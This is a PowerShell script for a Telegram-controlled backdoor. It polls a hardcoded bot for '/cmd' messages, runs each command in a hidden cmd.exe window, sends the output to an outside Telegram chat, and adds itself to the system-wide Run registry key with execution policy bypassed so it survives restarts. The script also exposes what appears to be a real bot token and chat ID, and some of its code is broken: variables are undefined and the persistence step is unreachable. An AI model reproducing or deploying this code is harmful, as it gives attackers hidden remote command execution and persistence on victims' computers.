$token = "8189296418:AAExUFzaL9z2BYQRvoNxOjWJtGrgu3N_sWo"
$chatId = "1562460007"
$aliveInterval = 2
$runningProcess = $null
$command = ""
$debugLogs = @()
$lastUpdateId = 0  # To keep track of the last processed update ID

function Send-TelegramMessage {
    param([string]$message)
    $messageWithCopyright = "$message`n--------{Made By @CodedNexus}-----"
    $url = "https://api.telegram.org/bot$token/sendMessage?chat_id=$chatId&text=$messageWithCopyright"
    try {
        Invoke-RestMethod -Uri $url -Method Get
    }
    catch {
        Log-DebugMessage "Error sending message: $_"
    }
}

function Log-DebugMessage {
    param([string]$message)
    Write-Host "[$(Get-Date -Format "yyyy-MM-dd HH:mm:ss")] $message"
    $debugLogs += "[$(Get-Date -Format "yyyy-MM-dd HH:mm:ss")] $message"
}

function Send-DebugLogs {
    if ($debugLogs.Count -gt 0) {
        $debugMessage = $debugLogs -join "`n"
        Send-TelegramMessage "Debug logs:`n$debugMessage"
        $debugLogs.Clear()
    }
}

function Get-TelegramUpdates {
    $url = "https://api.telegram.org/bot$token/getUpdates?offset=$($lastUpdateId + 1)"  # Using offset to process only new updates
    try {
        Log-DebugMessage "Fetching Telegram updates..."
        $response = Invoke-RestMethod -Uri $url -Method Get
        Log-DebugMessage "Received response: $($response | ConvertTo-Json)"
        
        if ($response.result.Count -gt 0) {
            foreach ($update in $response.result) {
                $lastUpdateId = $update.update_id  # Update the last processed update ID
                $command = $update.message.text
                if ($command -match "^/cmd (.+)$") {
                    Log-DebugMessage "Received command: $command"
                    Send-TelegramMessage "Command received: $command"
                    return $matches[1]  # Return the command to execute
                }
            }
        }
    }
    catch {
        Log-DebugMessage "Error getting updates: $_"
    }
}

function Execute-Command {
    param([string]$command)
    try {
        Log-DebugMessage "Executing command: $command"
        $processStartTime = Get-Date
        $process = Start-Process cmd.exe -ArgumentList "/C $command" -NoNewWindow -WindowStyle Hidden -PassThru
        $processOutput = $process.StandardOutput
        $processError = $process.StandardError

        while (!$process.HasExited) {
            if ($processOutput.Peek()) {
                $line = $processOutput.ReadLine()
                Send-TelegramMessage $line
                Log-DebugMessage "Output: $line"
            }
            if ($processError.Peek()) {
                $line = $processError.ReadLine()
                Send-TelegramMessage "Error: $line"
                Log-DebugMessage "Error: $line"
            }
            Start-Sleep -Milliseconds 200
        }

        $processExitCode = $process.ExitCode
        $processEndTime = Get-Date
        Log-DebugMessage "Command executed in $($processEndTime - $processStartTime). Exit code: $processExitCode"
        if ($processExitCode -ne 0) {
            Log-DebugMessage "Command failed with exit code $processExitCode"
        }
    }
    catch {
        Log-DebugMessage "Error executing command: $_"
    }
}

# Main loop to handle updates
while ($true) {
    Log-DebugMessage "Checking for Telegram updates..."
    $command = Get-TelegramUpdates

    if ($command) {
        Execute-Command $command
    } else {
        Log-DebugMessage "No new command received or invalid command."
    }

    Start-Sleep -Milliseconds 500
}

$regPath = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
$scriptArgs = "`"$scriptPath`""
$regKey = "powershell.exe -ExecutionPolicy Bypass -File $scriptArgs"

Log-DebugMessage "Attempting to add script to system-wide startup..."

if (-not (Test-Path "$regPath\$scriptName")) {
    Set-ItemProperty -Path $regPath -Name $scriptName -Value $regKey
    Log-DebugMessage "Script added to system-wide startup."
    Send-TelegramMessage "Script added to system-wide startup!"
} else {
    Log-DebugMessage "Script already in startup registry."
}

Send-DebugLogs
